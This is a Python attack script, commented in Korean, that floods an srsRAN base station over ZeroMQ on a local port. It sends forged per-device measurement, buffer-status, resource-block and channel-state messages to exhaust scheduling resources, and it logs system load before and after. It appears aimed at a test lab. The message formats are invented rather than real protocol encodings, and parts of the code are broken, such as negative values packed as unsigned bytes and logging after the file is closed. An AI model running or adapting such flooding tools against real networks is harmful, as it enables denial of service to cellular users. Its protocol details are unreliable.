#!/usr/bin/env python3
"""
Radio Resource Flood Attack
무선 자원 관리 시스템을 공격하여 eNB의 스케줄링 리소스를 고갈시키는 공격
"""

import zmq
import struct
import time
import threading
import random
import subprocess
import os
import re
from datetime import datetime

class RadioResourceFlood:
    def __init__(self, target_port=2001):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        self.attack_threads = []
        
        # 로그 설정
        self.log_dir = "logs"
        self.log_file = None
        self.start_time = None
        self.start_stats = None
        self.end_stats = None
    
    def get_system_stats(self):
        """시스템 리소스 통계 수집 (psutil 없이 시스템 명령어 사용)"""
        try:
            stats = {
                'timestamp': datetime.now().isoformat(),
                'cpu_percent': 0,
                'memory_percent': 0,
                'memory_used_gb': 0,
                'bytes_sent': 0,
                'bytes_recv': 0,
                'srsran_cpu': 0,
                'srsran_memory': 0
            }
            
            # CPU 사용량 (top 명령어 사용)
            try:
                result = subprocess.run(['top', '-l', '1', '-n', '0'], 
                                      capture_output=True, text=True, timeout=5)
                cpu_line = [line for line in result.stdout.split('\n') if 'CPU usage' in line]
                if cpu_line:
                    cpu_match = re.search(r'(\d+\.\d+)%', cpu_line[0])
                    if cpu_match:
                        stats['cpu_percent'] = float(cpu_match.group(1))
            except:
                pass
            
            # 메모리 사용량 (vm_stat 명령어 사용)
            try:
                result = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                page_size = 4096  # 기본 페이지 크기
                total_pages = 0
                free_pages = 0
                
                for line in lines:
                    if 'Pages free' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            free_pages = int(match.group(1))
                    elif 'Pages active' in line or 'Pages inactive' in line or 'Pages wired down' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            total_pages += int(match.group(1))
                
                total_pages += free_pages
                if total_pages > 0:
                    memory_used_bytes = (total_pages - free_pages) * page_size
                    memory_total_bytes = total_pages * page_size
                    stats['memory_percent'] = (memory_used_bytes / memory_total_bytes) * 100
                    stats['memory_used_gb'] = memory_used_bytes / (1024**3)
            except:
                pass
            
            # 네트워크 트래픽 (netstat 명령어 사용)
            try:
                result = subprocess.run(['netstat', '-ib'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                bytes_sent = 0
                bytes_recv = 0
                
                for line in lines:
                    if 'en0' in line or 'en1' in line:  # 이더넷 인터페이스
                        parts = line.split()
                        if len(parts) >= 10:
                            try:
                                bytes_sent += int(parts[6])  # obytes
                                bytes_recv += int(parts[9])  # ibytes
                            except:
                                pass
                
                stats['bytes_sent'] = bytes_sent
                stats['bytes_recv'] = bytes_recv
            except:
                pass
            
            # srsRAN 프로세스 리소스 (ps 명령어 사용)
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                for line in lines:
                    if 'srsenb' in line.lower():
                        parts = line.split()
                        if len(parts) >= 11:
                            try:
                                cpu = float(parts[2])  # CPU 사용률
                                memory = float(parts[3])  # 메모리 사용률
                                stats['srsran_cpu'] += cpu
                                stats['srsran_memory'] += memory
                            except:
                                pass
            except:
                pass
            
            return stats
            
        except Exception as e:
            print(f"리소스 통계 수집 오류: {e}")
            return None
    
    def log_message(self, message):
        """로그 메시지 출력 및 파일 저장"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        
        if self.log_file:
            self.log_file.write(log_msg + '\n')
            self.log_file.flush()
    
    def setup_logging(self, attack_type, duration):
        """로그 파일 설정"""
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_filename = f"{self.log_dir}/radio_resource_flood_{attack_type}_{timestamp}.log"
        
        self.log_file = open(log_filename, 'w', encoding='utf-8')
        self.log_message(f"=== Radio Resource Flood Attack 로그 시작 ===")
        self.log_message(f"공격 유형: {attack_type}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message(f"로그 파일: {log_filename}")
        self.log_message("=" * 50)
        
    def create_measurement_report(self, ue_id):
        """RRC Measurement Report 메시지 생성 (무선 자원 스케줄링 유발)"""
        message = struct.pack('>H', 0x0005)  # Message Type: RRC Measurement Report
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 다수의 측정값 포함 (스케줄링 알고리즘 부담 증가)
        for i in range(20):  # 20개 셀 측정값
            message += struct.pack('>H', random.randint(1, 65535))  # Cell ID
            message += struct.pack('>B', random.randint(-120, -50))  # RSRP
            message += struct.pack('>B', random.randint(-20, 0))   # RSRQ
            message += struct.pack('>B', random.randint(0, 100))   # SINR
        
        return message
    
    def create_buffer_status_report(self, ue_id):
        """Buffer Status Report 생성 (무선 자원 요청)"""
        message = struct.pack('>H', 0x0006)  # Message Type: Buffer Status Report
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 다수의 버퍼 상태 정보
        for i in range(10):  # 10개 버퍼 그룹
            message += struct.pack('>B', i)  # Buffer Group ID
            message += struct.pack('>I', random.randint(0, 1000000))  # Buffer Size
            message += struct.pack('>B', random.randint(0, 255))  # Priority
        
        return message
    
    def create_power_headroom_report(self, ue_id):
        """Power Headroom Report 생성 (무선 자원 관리)"""
        message = struct.pack('>H', 0x0007)  # Message Type: Power Headroom Report
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 복잡한 전력 정보
        message += struct.pack('>B', random.randint(0, 63))  # Power Headroom
        message += struct.pack('>B', random.randint(0, 63))  # PUSCH Power
        message += struct.pack('>B', random.randint(0, 63))  # PUCCH Power
        message += struct.pack('>B', random.randint(0, 63))  # SRS Power
        
        return message
    
    def create_prb_request(self, ue_id):
        """PRB (Physical Resource Block) 요청 메시지 생성"""
        message = struct.pack('>H', 0x0008)  # Message Type: PRB Request
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 다수의 PRB 요청
        for i in range(15):  # 15개 PRB 요청
            message += struct.pack('>H', random.randint(1, 100))  # PRB Count
            message += struct.pack('>B', random.randint(1, 10))  # Priority
            message += struct.pack('>B', random.randint(0, 255))  # QoS Class
            message += struct.pack('>I', random.randint(1000, 10000))  # Data Size
        
        return message
    
    def create_channel_state_info(self, ue_id):
        """Channel State Information 생성 (무선 자원 최적화)"""
        message = struct.pack('>H', 0x0009)  # Message Type: Channel State Info
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 복잡한 채널 상태 정보
        for i in range(25):  # 25개 서브캐리어
            message += struct.pack('>H', i)  # Subcarrier Index
            message += struct.pack('>B', random.randint(-30, 0))  # Channel Gain
            message += struct.pack('>B', random.randint(0, 100))  # SNR
            message += struct.pack('>B', random.randint(0, 100))  # CQI
        
        return message
    
    def send_message(self, message, message_type):
        """메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f'tcp://localhost:{self.target_port}')
            
            socket.send(message, zmq.NOBLOCK)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type}: {len(message)} bytes")
            
            socket.close()
            return True
            
        except Exception as e:
            print(f"메시지 전송 오류: {e}")
            return False
    
    def measurement_flooding(self, num_ues=50, duration=60):
        """측정 보고 플러딩 (무선 자원 스케줄링 공격)"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 다수 UE가 동시에 측정 보고
                for ue_id in range(num_ues):
                    measurement = self.create_measurement_report(1000 + ue_id)
                    self.send_message(measurement, f"Measurement Report UE {ue_id}")
                    time.sleep(0.001)  # 매우 짧은 간격
                
                time.sleep(0.05)  # 다음 라운드까지 대기
                
            except Exception as e:
                print(f"측정 플러딩 오류: {e}")
                time.sleep(1)
    
    def resource_request_flooding(self, num_ues=30, duration=60):
        """자원 요청 플러딩 (PRB 스케줄링 공격)"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 다수 UE가 동시에 자원 요청
                for ue_id in range(num_ues):
                    # Buffer Status Report
                    buffer_report = self.create_buffer_status_report(1000 + ue_id)
                    self.send_message(buffer_report, f"Buffer Status UE {ue_id}")
                    
                    # PRB Request
                    prb_request = self.create_prb_request(1000 + ue_id)
                    self.send_message(prb_request, f"PRB Request UE {ue_id}")
                    
                    time.sleep(0.001)  # 매우 짧은 간격
                
                time.sleep(0.1)  # 다음 라운드까지 대기
                
            except Exception as e:
                print(f"자원 요청 플러딩 오류: {e}")
                time.sleep(1)
    
    def channel_state_flooding(self, num_ues=40, duration=60):
        """채널 상태 플러딩 (무선 자원 최적화 공격)"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 다수 UE가 동시에 채널 상태 보고
                for ue_id in range(num_ues):
                    # Channel State Information
                    channel_info = self.create_channel_state_info(1000 + ue_id)
                    self.send_message(channel_info, f"Channel State UE {ue_id}")
                    
                    # Power Headroom Report
                    power_report = self.create_power_headroom_report(1000 + ue_id)
                    self.send_message(power_report, f"Power Headroom UE {ue_id}")
                    
                    time.sleep(0.001)  # 매우 짧은 간격
                
                time.sleep(0.08)  # 다음 라운드까지 대기
                
            except Exception as e:
                print(f"채널 상태 플러딩 오류: {e}")
                time.sleep(1)
    
    def start_attack(self, attack_type="measurement", num_ues=50, duration=60):
        """공격 시작"""
        # 로그 설정
        self.setup_logging(attack_type, duration)
        
        # 시작 시 리소스 통계 수집
        self.start_time = datetime.now()
        self.start_stats = self.get_system_stats()
        
        if self.start_stats:
            self.log_message("=== 공격 시작 시 리소스 상태 ===")
            self.log_message(f"CPU 사용량: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"메모리 사용량: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
            self.log_message("=" * 50)
        
        self.log_message(f"=== Radio Resource Flood Attack 시작 ===")
        self.log_message(f"공격 유형: {attack_type}")
        self.log_message(f"UE 수: {num_ues}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message("=" * 50)
        
        self.running = True
        
        if attack_type == "measurement":
            # 측정 보고 플러딩
            thread = threading.Thread(target=self.measurement_flooding, args=(num_ues, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "resource":
            # 자원 요청 플러딩
            thread = threading.Thread(target=self.resource_request_flooding, args=(num_ues, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "channel":
            # 채널 상태 플러딩
            thread = threading.Thread(target=self.channel_state_flooding, args=(num_ues, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "mixed":
            # 혼합 공격
            thread1 = threading.Thread(target=self.measurement_flooding, args=(num_ues//3, duration))
            thread2 = threading.Thread(target=self.resource_request_flooding, args=(num_ues//3, duration))
            thread3 = threading.Thread(target=self.channel_state_flooding, args=(num_ues//3, duration))
            
            thread1.daemon = True
            thread2.daemon = True
            thread3.daemon = True
            
            thread1.start()
            thread2.start()
            thread3.start()
            
            self.attack_threads.extend([thread1, thread2, thread3])
        
        # 공격 지속 시간 대기
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        self.log_message("\n=== 공격 중지 ===")
        self.running = False
        
        # 스레드 종료 대기
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        # 종료 시 리소스 통계 수집
        self.end_stats = self.get_system_stats()
        
        if self.start_stats and self.end_stats:
            self.log_message("=== 공격 종료 시 리소스 상태 ===")
            self.log_message(f"CPU 사용량: {self.end_stats['cpu_percent']:.1f}% (시작: {self.start_stats['cpu_percent']:.1f}%)")
            self.log_message(f"메모리 사용량: {self.end_stats['memory_percent']:.1f}% (시작: {self.start_stats['memory_percent']:.1f}%)")
            self.log_message(f"메모리 사용량: {self.end_stats['memory_used_gb']:.2f}GB (시작: {self.start_stats['memory_used_gb']:.2f}GB)")
            
            # 네트워크 트래픽 차이 계산
            bytes_sent_diff = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_diff = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            self.log_message(f"네트워크 송신 증가: {bytes_sent_diff:,} bytes")
            self.log_message(f"네트워크 수신 증가: {bytes_recv_diff:,} bytes")
            
            self.log_message(f"srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}% (시작: {self.start_stats['srsran_cpu']:.1f}%)")
            self.log_message(f"srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}% (시작: {self.start_stats['srsran_memory']:.1f}%)")
            
            # 공격 지속 시간 계산
            if self.start_time:
                duration = datetime.now() - self.start_time
                self.log_message(f"공격 지속 시간: {duration.total_seconds():.1f}초")
            
            self.log_message("=" * 50)
        
        # ZeroMQ 정리
        self.context.term()
        
        # 로그 파일 닫기
        if self.log_file:
            self.log_file.close()
            self.log_message(f"로그 파일 저장 완료")
        
        self.log_message("공격 완료")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Radio Resource Flood Attack')
    parser.add_argument('--attack-type', choices=['measurement', 'resource', 'channel', 'mixed'], 
                       default='measurement', help='공격 유형')
    parser.add_argument('--num-ues', type=int, default=50, help='UE 수')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--target-port', type=int, default=2001, help='대상 포트')
    
    args = parser.parse_args()
    
    attack = RadioResourceFlood(args.target_port)
    
    try:
        attack.start_attack(args.attack_type, args.num_ues, args.duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
